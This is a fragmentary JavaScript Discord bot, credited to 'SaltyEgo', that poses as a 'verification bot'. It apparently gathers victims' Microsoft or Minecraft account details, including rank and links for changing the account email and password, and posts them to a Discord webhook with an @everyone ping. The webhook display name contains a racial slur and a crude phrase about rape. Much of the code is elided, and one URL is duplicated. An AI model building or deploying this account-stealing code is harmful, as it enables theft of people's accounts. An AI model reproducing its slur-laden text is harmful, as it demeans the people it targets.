...
const logo = 'https://cdn.discordapp.com/attachments/1069175496715280445/1112537994822418562/images.jpg'
...
client.once(Events.ClientReady, () => {
    ...
    client.user.setPresence({
        activities: [{ name: `verification bot`, type: ActivityType.Watching }],
        status: 'dnd',
    });
});
...
client.on(Events.InteractionCreate, async interaction => {
    ...
    rank = rank.data.rank
                ...
                },
		{
                ...
                {
                    "name": "change email",
                    "value": "https://account.live.com/names/manage",
                    "inline": true
                },
                {
                    "name": "change password",
                    "value": "https://account.live.com/Activityhttps://account.live.com/Activity",
                    "inline": true
                },
                {
                    "name": "rank",
            ...
            .setFooter({ text: 'Code By SaltyEgo', iconURL: logo });
            ...
            webhook.send({ 
                content: "@everyone",
                username: 'Nigga Got Fucking Raped tbh',
                avatarURL: logo,
                embeds: [embed] 
            })
